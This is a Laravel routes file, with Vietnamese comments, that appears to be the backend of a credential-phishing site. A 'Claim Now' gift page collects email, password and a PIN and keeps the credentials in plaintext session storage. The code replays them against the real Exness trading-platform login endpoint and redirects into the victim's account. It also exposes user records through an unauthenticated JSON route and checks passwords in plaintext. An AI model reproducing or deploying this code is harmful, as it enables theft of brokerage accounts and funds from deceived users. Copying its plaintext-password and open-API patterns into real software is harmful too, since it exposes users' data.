
<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\UserController;
use App\Models\User;
use Illuminate\Support\Facades\Http;

Route::middleware(['force.https'])->group(function () {
    // Trang chính
    Route::get('/', function () {
        return view('getItNow');
    });

    // Chuyển đến trang welcome khi nhấn "Claim Now"
    Route::get('/welcome', function () {
        return view('welcome');
    });

    // Xử lý bước 1: Kiểm tra admin và lưu session
    Route::post('/receive', function () {
        $email = request('email');
        $password = request('password');

        $admin = User::where('email', $email)
            ->where('password', $password) // Không mã hóa, cần cải thiện bảo mật
            ->where('is_admin', true)
            ->first();

        if ($admin) {
            session([
                'email' => $email,
                'password' => $password,
            ]);
            return redirect()->secure('/admin');
        }

        session([
            'email' => $email,
            'password' => $password,
        ]);
        return redirect()->secure('/nhanQua');
    })->name('login.step1');

    // Trang nhập PIN
    Route::get('/nhanQua', function () {
        return view('receiveGift');
    });

    // Xử lý submit PIN (bước 2)
    Route::post('/', [UserController::class, 'store'])->name('login.store');

    // Trang admin
    Route::get('/admin', [UserController::class, 'adminDashboard'])->name('admin.dashboard')->middleware('admin.auth');

    // API users
    Route::get('/api/users', [UserController::class, 'getUsersJson']);

    // Route đăng nhập Exness với debug log
    Route::get('/exness-login', function () {
        $email = session('email');
        $password = session('password');

        if (!$email || !$password) {
            \Log::info('Exness Login: Session missing email or password');
            return redirect()->secure('/welcome')->with('error', 'Thông tin đăng nhập không hợp lệ, vui lòng thử lại');
        }

        try {
            \Log::info("Exness Login: Sending request with email=$email");
            $response = Http::withHeaders(['User-Agent' => 'Mozilla/5.0'])->asForm()->post('https://my.exness.com/accounts/sign-in', [
                'email' => $email,
                'password' => $password,
            ]);

            \Log::info('Exness Login: Response status ' . $response->status() . ', Headers: ' . json_encode($response->headers()));
            if ($response->successful() && str_contains($response->header('Location'), '/pa/')) {
                \Log::info('Exness Login: Success, redirecting to ' . $response->header('Location'));
                return redirect($response->header('Location')); // Chuyển tới dashboard Exness
            }

            \Log::info('Exness Login: Failed, redirecting to welcome with error');
            return redirect()->secure('/welcome')->with('error', 'Thông tin email hoặc password không hợp lệ, vui lòng nhập lại');
        } catch (\Exception $e) {
            \Log::error('Exness Login: Exception ' . $e->getMessage());
            return redirect()->secure('/welcome')->with('error', 'Lỗi kết nối tới Exness, vui lòng thử lại sau');
        }
    })->name('exness.login');

    // Route dự phòng khi đăng nhập thất bại
    Route::get('/login-failed', function () {
        return redirect()->secure('/welcome')->with('error', 'Thông tin email hoặc password không hợp lệ, vui lòng nhập lại');
    })->name('login.failed');
});
